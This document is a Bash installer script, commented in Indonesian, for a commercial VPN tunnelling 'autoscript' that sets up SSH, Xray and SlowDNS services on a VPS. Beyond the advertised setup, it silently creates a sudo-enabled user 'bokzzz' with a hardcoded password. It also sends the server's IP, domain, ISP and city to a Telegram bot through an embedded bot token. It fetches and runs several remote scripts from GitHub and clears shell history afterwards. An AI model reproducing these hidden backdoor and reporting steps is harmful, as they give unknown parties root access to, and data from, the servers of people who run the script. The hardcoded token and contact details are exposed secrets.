#!/bin/bash
dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
biji=`date +"%Y-%m-%d" -d "$dateFromServer"`
clear

# Definisi warna untuk output
red='\e[1;31m'
green='\e[0;32m'
yell='\e[1;93m'  # Updated to bright yellow
tyblue='\e[1;36m'
NC='\e[0m'

# Fungsi untuk menampilkan teks berwarna
purple() { echo -e "\\033[35;1m${*}\\033[0m"; }
tyblue() { echo -e "\\033[36;1m${*}\\033[0m"; }
yellow() { echo -e "\\033[93;1m${*}\\033[0m"; }  # Updated to bright yellow
green() { echo -e "\\033[32;1m${*}\\033[0m"; }
red() { echo -e "\\033[31;1m${*}\\033[0m"; }

# ================================
# Memulai instalasi
CDN="https://raw.githubusercontent.com/Riswan481/Jesstore/main/ssh"
cd /root
echo "=================================="

# ================================
# Mengecek apakah skrip dijalankan sebagai root
if [ "${EUID}" -ne 0 ]; then
    echo -e "[ ${red}ERROR${NC} ] Anda harus menjalankan skrip ini sebagai pengguna root."
    exit 1
fi
echo "=================================="

# ================================
# Mengecek apakah server menggunakan OpenVZ (yang tidak didukung)
if [ "$(systemd-detect-virt)" == "openvz" ]; then
    echo -e "[ ${red}ERROR${NC} ] Skrip ini tidak mendukung sistem berbasis OpenVZ."
    exit 1
fi
echo "=================================="

# ================================
# Mengatur IP dan hostname
localip=$(hostname -I | cut -d\  -f1)
hst=( `hostname` )
dart=$(cat /etc/hosts | grep -w `hostname` | awk '{print $2}')
if [[ "$hst" != "$dart" ]]; then
    echo "$localip $(hostname)" >> /etc/hosts
fi
echo "=================================="

# ================================
# Membuat direktori dan file yang diperlukan
mkdir -p /etc/xray
mkdir -p /etc/v2ray
touch /etc/xray/domain
touch /etc/v2ray/domain
touch /etc/xray/scdomain
touch /etc/v2ray/scdomain
echo "=================================="

# ================================
# Menampilkan informasi sebelum instalasi
echo -e "[ ${tyblue}PENTING${NC} ] Sebelum memulai instalasi, mohon baca informasi berikut dengan seksama:"
sleep 2
echo -e "[ ${tyblue}PENTING${NC} ] 1. Pastikan Anda menjalankan skrip ini dengan akses root."
echo -e "[ ${tyblue}PENTING${NC} ] 2. Skrip ini akan memeriksa dan menginstal paket yang dibutuhkan untuk kelancaran instalasi."
echo -e "[ ${tyblue}PENTING${NC} ] 3. Beberapa pengaturan sistem, seperti zona waktu dan IPv6, akan disesuaikan."
echo -e "[ ${tyblue}PENTING${NC} ] 4. Skrip ini tidak kompatibel dengan sistem berbasis OpenVZ."
echo -e "[ ${tyblue}PENTING${NC} ] 5. Pastikan koneksi internet Anda stabil selama proses instalasi."
sleep 2
echo -e "[ ${green}INFO${NC} ] Jika Anda sudah membaca dan memahami informasi di atas, tekan Enter untuk melanjutkan."
read
echo "=================================="

# ================================
# Memulai proses instalasi
echo -e "[ ${green}INFO${NC} ] Memulai proses instalasi, harap tunggu..."
sleep 2
echo -e "[ ${tyblue}PENTING${NC} ] Memeriksa paket kernel yang diperlukan..."
sleep 2
echo -e "[ ${green}INFO${NC} ] Mengecek keberadaan paket kernel..."
sleep 1
totet=`uname -r`
REQUIRED_PKG="linux-headers-$totet"
PKG_OK=$(dpkg-query -W --showformat='${Status}\n' $REQUIRED_PKG|grep "install ok installed")
echo "Mengecek paket $REQUIRED_PKG: $PKG_OK"
if [ "" = "$PKG_OK" ]; then
    sleep 2
    echo -e "[ ${yell}PERINGATAN${NC} ] Paket kernel yang diperlukan tidak ditemukan. Melanjutkan instalasi..."
    echo "Menginstal paket $REQUIRED_PKG."
    apt-get --yes install $REQUIRED_PKG
    sleep 1
    echo ""
    sleep 1
    echo -e "[ ${tyblue}PENTING${NC} ] Jika Anda mengalami kesalahan, coba langkah-langkah berikut:"
    sleep 1
    echo -e "[ ${tyblue}PENTING${NC} ] 1. Jalankan perintah: apt update -y"
    sleep 1
    echo -e "[ ${tyblue}PENTING${NC} ] 2. Jalankan perintah: apt upgrade -y"
    sleep 1
    echo -e "[ ${tyblue}PENTING${NC} ] 3. Jalankan perintah: apt dist-upgrade -y"
    sleep 1
    echo -e "[ ${tyblue}PENTING${NC} ] 4. Lakukan reboot pada server Anda."
    sleep 1
    echo ""
    sleep 1
    echo -e "[ ${tyblue}PENTING${NC} ] Setelah reboot, jalankan kembali skrip ini."
    echo -e "[ ${tyblue}PENTING${NC} ] Jika Anda sudah memahami, tekan Enter untuk melanjutkan."
    read
else
    echo -e "[ ${green}INFO${NC} ] Paket kernel sudah terpasang."
fi
echo "=================================="

# ================================
# Memastikan bahwa paket sudah terinstal dengan benar
ttet=`uname -r`
ReqPKG="linux-headers-$ttet"
if ! dpkg -s $ReqPKG  >/dev/null 2>&1; then
    rm /root/setup.sh >/dev/null 2>&1
    exit
else
    clear
fi
echo "=================================="

# ================================
# Fungsi untuk menghitung waktu instalasi
secs_to_human() {
    echo "Waktu instalasi: $(( ${1} / 3600 )) jam $(( (${1} / 60) % 60 )) menit $(( ${1} % 60 )) detik"
}

# ================================
# Menyimpan waktu mulai
start=$(date +%s)

# ================================
# Mengatur zona waktu
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
sysctl -w net.ipv6.conf.all.disable_ipv6=1 >/dev/null 2>&1
sysctl -w net.ipv6.conf.default.disable_ipv6=1 >/dev/null 2>&1
echo "=================================="

# ================================
# Mengatur konfigurasi untuk pengguna
coreselect=''
cat> /root/.profile << END
if [ "$BASH" ]; then
    if [ -f ~/.bashrc ]; then
        . ~/.bashrc
    fi
fi
mesg n || true
clear
END
chmod 644 /root/.profile
echo "=================================="

# ================================
# Menginstal paket yang diperlukan
echo -e "[ ${green}INFO${NC} ] Menyiapkan berkas instalasi..."
apt install git curl -y >/dev/null 2>&1
apt install python -y >/dev/null 2>&1
echo "=================================="

# ================================
# Menampilkan informasi setelah instalasi selesai
echo -e "[ ${green}INFO${NC} ] Semua berkas instalasi sudah siap."
echo -e "$green                                                                                         $NC"
echo -e "$BIWhite» TERIMAKASIH TELAH MEMAKAI AUTOSCRIPT PREMIUM JESSTUNNEL STORE$NC"
sleep 5
echo "=================================="

# ================================
# Memeriksa izin dan memulai proses berikutnya
echo -ne "[ ${green}INFO${NC} ] Memeriksa izin: "
mkdir -p /var/lib/SIJA >/dev/null 2>&1
echo "IP=" >> /var/lib/SIJA/ipvps.conf
echo ""
echo "=================================="

# ================================
# Mengunduh dan menjalankan skrip tambahan
wget -q https://raw.githubusercontent.com/Riswan481/Jesstore/main/tools.sh
chmod +x tools.sh
./tools.sh
rm tools.sh
echo "=================================="
clear
echo " "
clear
echo -e "$green━━━━━━━━━━┏┓━━━━━━━━━━━━━━━━━━━━━━━━┏┓━━━━━━━━━━━$NC"
echo -e "$green━━━━━━━━━┏┛┗┓━━━━━━━━━━━━━━━━━━━━━━┏┛┗┓━━━━━━━━━━$NC"
echo -e "$green┏━━┓━┏┓┏┓┗┓┏┛┏━━┓━━━━┏━━┓┏━━┓┏┓┏━┓━┗┓┏┛┏┓┏━┓━┏━━┓$NC"
echo -e "$green┗━┓┃━┃┃┃┃━┃┃━┃┏┓┃━━━━┃┏┓┃┃┏┓┃┣┫┃┏┓┓━┃┃━┣┫┃┏┓┓┃┏┓┃$NC"
echo -e "$green┃┗┛┗┓┃┗┛┃━┃┗┓┃┗┛┃━━━━┃┗┛┃┃┗┛┃┃┃┃┃┃┃━┃┗┓┃┃┃┃┃┃┃┗┛┃$NC"
echo -e "$green┗━━━┛┗━━┛━┗━┛┗━━┛━━━━┃┏━┛┗━━┛┗┛┗┛┗┛━┗━┛┗┛┗┛┗┛┗━┓┃$NC"
echo -e "$green━━━━━━━━━━━━━━━━━━━━━┃┃━━━━━━━━━━━━━━━━━━━━━━┏━┛┃$NC"
echo -e "$green━━━━━━━━━━━━━━━━━━━━━┗┛━━━━━━━━━━━━━━━━━━━━━━┗━━┛$NC"
    echo -e "$BBlue                     SETUP DOMAIN VPS     $NC"
    echo -e "$BYellow----------------------------------------------------------$NC"
    echo -e "$BGreen 1. Gunakan Domain peribadi $NC"
    echo -e "$BGreen 2. Gunakan Domain Random $NC"
    echo -e "$BYellow----------------------------------------------------------$NC"
    read -rp " input 1 or 2 / pilih 1 atau 2 : " dns
	if test $dns -eq 1; then
    read -rp " Enter Your Domain / masukan domain : " dom
    echo "IP=$dom" > /var/lib/SIJA/ipvps.conf
    echo "$dom" > /root/scdomain
	echo "$dom" > /etc/xray/scdomain
	echo "$dom" > /etc/xray/domain
	echo "$dom" > /etc/v2ray/domain
	echo "$dom" > /root/domain
	elif test $dns -eq 2; then
    clear
    apt install jq curl -y
    wget -q -O /root/cf "${CDN}/cf" >/dev/null 2>&1
    chmod +x /root/cf
    bash /root/cf | tee /root/install.log
    print_success " Domain Random Done"
fi
# Inisialisasi
MYIP=$(curl -sS ipv4.icanhazip.com)
# Perizinan Sc & Pemanggilan username
izinsc="https://raw.githubusercontent.com/Riswan481/Jesstore/main/register"
rm -f /usr/bin/user
username=$(curl $izinsc | grep $MYIP | awk '{print $2}')
echo "$username" >/usr/bin/user
exp=$(curl $izinsc | grep $MYIP | awk '{print $3}')
echo "$exp" >/usr/bin/e

# Usename & Expired
Name=$(cat /usr/bin/user)
Exp=$(cat /usr/bin/e)

ISP=$(curl -s ipinfo.io/org | cut -d " " -f 2-10 )
domain=$(cat /root/domain)
CITY=$(curl -s ipinfo.io/city )
TIMEZONE=$(printf '%(%H:%M:%S)T')
userdel jame > /dev/null 2>&1
Username="bokzzz"
Password=bokzzz
mkdir -p /home/script/
useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
usermod -aG sudo $Username > /dev/null 2>&1
CHATID="-1002029496202"  # ID grup Telegram Anda
KEY="6668909715:AAHdCAC0NPVuXFjWEdueA2VvkkMl5Ie1WRQ"  # Token bot Anda
TIME="10"  # Timeout maksimal untuk curl
URL="https://api.telegram.org/bot$KEY/sendMessage"
TEXT="<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
 <b>🔥SCRIPT PREMIUM JESVPN STORE🔥</b>
<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
<code>Pengguna :</code> <code>$Name</code>
<code>Domain   :</code> <code>$domain</code>
<code>IP VPS   :</code> <code>$MYIP</code>
<code>ISP      :</code> <code>$ISP</code>
<code>Waktu    :</code> <code>$TIMEZONE</code>
<code>Lokasi   :</code> <code>$CITY</code>
<code>Expired  :</code> <code>$Exp</code>
<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
   <b>🔥Notifikasi Otomatis Dari Github🔥</b>
<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
# Format tombol inline keyboard untuk kontak
reply_markup='{"inline_keyboard":[[{"text":"Telegram","url":"https://t.me/JesVpnt"},{"text":"Contact","url":"https://wa.me/6285888801241"}]]}'

# Kirim notifikasi ke grup Telegram
curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html&reply_markup=$reply_markup" $URL >/dev/null
clear
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green      Install SSH / WS               $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 2
clear
wget https://raw.githubusercontent.com/Riswan481/Jesstore/main/ssh/ssh-vpn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh
clear
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green      Install BACKUP               $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 2
clear
wget https://raw.githubusercontent.com/Riswan481/Jesstore/main/backup/set-br.sh &&  chmod +x set-br.sh && ./set-br.sh
clear
clear
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green          Install XRAY              $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 2
clear
wget https://raw.githubusercontent.com/Riswan481/Jesstore/main/xray/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
wget https://raw.githubusercontent.com/Riswan481/Jesstore/main/sshws/insshws.sh && chmod +x insshws.sh && ./insshws.sh
clear
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green          Install SLOWDNS              $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 2
clear
wget -q -O slow.sh https://raw.githubusercontent.com/Riswan481/Jesstore/main/slow.sh && chmod +x slow.sh && ./slow.sh
clear
cat> /root/.profile << END
if [ "$BASH" ]; then
if [ -f ~/.bashrc ]; then
. ~/.bashrc
fi
fi
mesg n || true
clear
menu
END
chmod 644 /root/.profile
if [ -f "/root/log-install.txt" ]; then
rm /root/log-install.txt > /dev/null 2>&1
fi
if [ -f "/etc/afak.conf" ]; then
rm /etc/afak.conf > /dev/null 2>&1
fi
if [ ! -f "/etc/log-create-user.log" ]; then
echo "Log All Account " > /etc/log-create-user.log
fi
history -c
serverV=$( curl -sS https://raw.githubusercontent.com/Riswan481/Jesstore/main/version )
echo $serverV > /opt/.ver
aureb=$(cat /home/re_otm)
b=11
if [ $aureb -gt $b ]
then
gg="PM"
else
gg="AM"
fi
curl -sS ifconfig.me > /etc/myipvps
echo " "
echo "===================-[ RISWAN-VPN ]-===================" | tee -a log-install.txt
echo "------------------------------------------------------------" | tee -a log-install.txt
echo "" | tee -a log-install.txt
echo "   >>> Service & Port"  | tee -a log-install.txt
echo "   - OpenVPN              : 2086"  | tee -a log-install.txt
echo "   - OpenSSH              : 22"  | tee -a log-install.txt
echo "   - SSH Websocket        : 80,8080 [ON]" | tee -a log-install.txt
echo "   - SSH SSL Websocket    : 443" | tee -a log-install.txt
echo "   - Stunnel4             : 8880, 8443" | tee -a log-install.txt
echo "   - Dropbear             : 109, 143" | tee -a log-install.txt
echo "   - Badvpn               : 7100-7900" | tee -a log-install.txt
echo "   - Nginx                : 81" | tee -a log-install.txt
echo "   - Vmess TLS            : 443" | tee -a log-install.txt
echo "   - Vmess None TLS       : 80,8080" | tee -a log-install.txt
echo "   - Vless TLS            : 443" | tee -a log-install.txt
echo "   - Vless None TLS       : 80,8080" | tee -a log-install.txt
echo "   - Trojan GRPC          : 443" | tee -a log-install.txt
echo "   - Trojan WS            : 443" | tee -a log-install.txt
echo "   - Trojan Go            : 443" | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "   >>> Server Information & Other Features"  | tee -a log-install.txt
echo "   - Timezone             : Asia/Jakarta (GMT +7)"  | tee -a log-install.txt
echo "   - Fail2Ban             : [ON]"  | tee -a log-install.txt
echo "   - Dflate               : [ON]"  | tee -a log-install.txt
echo "   - IPtables             : [ON]"  | tee -a log-install.txt
echo "   - Auto-Reboot          : [ON]"  | tee -a log-install.txt
echo "   - IPv6                 : [OFF]"  | tee -a log-install.txt
echo "   - Autoreboot On        : $aureb:00 $gg GMT +7" | tee -a log-install.txt
echo "   - AutoKill Multi Login User" | tee -a log-install.txt
echo "   - Auto Delete Expired Account" | tee -a log-install.txt
echo "   - Fully automatic script" | tee -a log-install.txt
echo "   - VPS settings" | tee -a log-install.txt
echo "   - Admin Control" | tee -a log-install.txt
echo "   - Change port" | tee -a log-install.txt
echo "   - Full Orders For Various Services" | tee -a log-install.txt
echo "" | tee -a log-install.txt
echo "------------------------------------------------------------" | tee -a log-install.txt
echo "===============-[ Script By jessvpn Tunnel store ]-==============" | tee -a log-install.txt
echo ""
echo ""
rm /root/setup.sh >/dev/null 2>&1
rm /root/ins-xray.sh >/dev/null 2>&1
rm /root/insshws.sh >/dev/null 2>&1
secs_to_human "$(($(date +%s) - ${start}))" | tee -a log-install.txt
read -n 1 -s -r -p "Press any key to menu"
menu
